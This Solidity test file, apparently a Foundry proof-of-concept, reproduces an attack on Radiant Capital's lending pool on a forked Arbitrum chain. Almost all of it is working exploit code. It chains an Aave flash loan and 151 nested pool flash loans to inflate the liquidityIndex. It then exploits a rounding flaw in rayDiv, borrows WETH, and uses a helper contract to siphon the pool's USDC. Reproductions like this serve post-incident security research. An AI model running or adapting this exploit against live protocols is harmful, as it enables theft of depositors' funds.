// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IAaveV3.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV3.sol";

import "./IRadiantLendingPool.sol";

ILendingPool constant AaveV3Pool = ILendingPool(
    0x794a61358D6845594F94dc1DB02A252b5b4814aD
);
IRadiantLendingPool constant RadiantLendingPool = IRadiantLendingPool(
    0xF4B1486DD74D07706052A33d31d7c0AAFD0659E1
);

WETH9 constant WETH = WETH9(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
IERC20 constant USDC = IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
IERC20 constant rUSDCn = IERC20(0x3a2d44e354f2d88EF6DA7A5A4646fd70182A7F55);
IERC20 constant rWETH = IERC20(0x0dF5dfd95966753f01cb80E76dc20EA958238C46);

IUniswapV3Pool constant WETH_USDC = IUniswapV3Pool(
    0xC6962004f452bE9203591991D15f6b388e09E8D0
);

contract HelperExploit is Test {
    function siphonFundsFromPool(uint256 amount) external {
        USDC.transferFrom(msg.sender, address(this), amount << 1);
        USDC.approve(address(RadiantLendingPool), type(uint256).max);
        bool depositSingleAmount;
        while (true) {
            if (USDC.balanceOf(address(rUSDCn)) < 1) {
                break;
            }
            if (depositSingleAmount == true) {
                RadiantLendingPool.deposit(
                    address(USDC),
                    amount,
                    address(this),
                    0
                );
            } else {
                RadiantLendingPool.deposit(
                    address(USDC),
                    amount << 1,
                    address(this),
                    0
                );
                depositSingleAmount = true;
            }
            if (USDC.balanceOf(address(rUSDCn)) > ((amount * 3) >> 1) - 1) {
                RadiantLendingPool.withdraw(
                    address(USDC),
                    ((amount * 3) >> 1) - 1,
                    address(this)
                );
            } else {
                RadiantLendingPool.withdraw(
                    address(USDC),
                    USDC.balanceOf(address(rUSDCn)),
                    address(this)
                );
                USDC.transfer(msg.sender, USDC.balanceOf(address(this)));
            }
        }
    }
}

contract RadiantCapitalTest is Test {
    uint160 constant MAX_SQRT_RATIO =
        1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_342;
    uint160 constant MIN_SQRT_RATIO = 4_295_128_739;
    uint8 operationId = 1;

    function setUp() public {
        vm.createSelectFork("arbitrum", 166405686);
        vm.label(address(AaveV3Pool), "AaveV3Pool");
        vm.label(address(USDC), "USDC");
        vm.label(address(rUSDCn), "rUSDCn");
        vm.label(address(rWETH), "rWETH");
        vm.label(address(WETH), "WETH");
        vm.label(address(RadiantLendingPool), "RadiantLendingPool");
        vm.label(address(WETH_USDC), "WETH_USDC");
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function takeFlashLoan(
        address where,
        uint256 amount,
        bytes memory params
    ) internal {
        address[] memory assets = new address[](1);
        assets[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;
        uint256[] memory interestRateModes = new uint256[](1);
        interestRateModes[0] = 0;
        ILendingPool(where).flashLoan(
            address(this),
            assets,
            amounts,
            interestRateModes,
            address(this),
            params,
            0
        );
    }

    function testExploit() public {
        print("WETH balance before", WETH.balanceOf(address(this)), 18);

        USDC.approve(address(RadiantLendingPool), type(uint256).max);

        bytes memory params = abi.encode(
            address(RadiantLendingPool),
            address(rUSDCn),
            address(rWETH),
            address(WETH_USDC),
            uint256(1),
            uint256(0)
        );
        // Start flashloan attack to manipulate the liquidityIndex value
        takeFlashLoan(address(AaveV3Pool), 3000000 * 1e6, params);

        print("WETH balance after", WETH.balanceOf(address(this)), 18);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        assets;
        amounts;
        premiums;
        initiator;
        params;

        if ((operationId - 1) != 0) {
            if (operationId == 2) {
                operationId = 3;
                uint256 rUSDCnBalanceBeforeTransfer = rUSDCn.balanceOf(
                    address(this)
                );
                USDC.transfer(address(rUSDCn), rUSDCn.balanceOf(address(this)));
                RadiantLendingPool.withdraw(
                    address(USDC),
                    rUSDCnBalanceBeforeTransfer - 1,
                    address(this)
                );
            }
        } else {
            RadiantLendingPool.deposit(
                address(USDC),
                2000000 * 1e6,
                address(this),
                0
            );
            operationId = 2;
            uint8 i;
            while (i < 151) {
                takeFlashLoan(
                    address(RadiantLendingPool),
                    2000000 * 1e6,
                    abi.encode(type(uint256).max)
                );
                ++i;
            }
            // End flashloan attack

            // To update: find a way to calculate below WETH amount
            uint256 amountToBorrow = 90_690_695_360_221_284_999;
            RadiantLendingPool.borrow(
                address(WETH),
                amountToBorrow,
                2,
                0,
                address(this)
            );
            uint256 transferAmount = rUSDCn.balanceOf(address(this));
            HelperExploit helper = new HelperExploit();
            USDC.approve(address(helper), type(uint256).max);
            // liquidityIndex is shifted to a very larger value so flaw (rounding issue) in rayDiv function can be used to take all the funds from pool
            helper.siphonFundsFromPool(transferAmount);

            WETH.approve(address(WETH_USDC), type(uint256).max);
            USDC.approve(address(WETH_USDC), type(uint256).max);
            WETH_USDC.swap(address(this), true, 2e18, MIN_SQRT_RATIO + 1, "");
            WETH_USDC.swap(
                address(this),
                false,
                3_232_558_736,
                MAX_SQRT_RATIO - 1,
                ""
            );
        }

        // Repaying Aave flashloan
        USDC.approve(address(AaveV3Pool), type(uint256).max);
        return true;
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external {
        data;
        if (amount0Delta > 0) {
            WETH.transfer(address(WETH_USDC), uint256(amount0Delta));
        } else {
            USDC.transfer(address(WETH_USDC), uint256(amount1Delta));
        }
    }

    receive() external payable {}
}
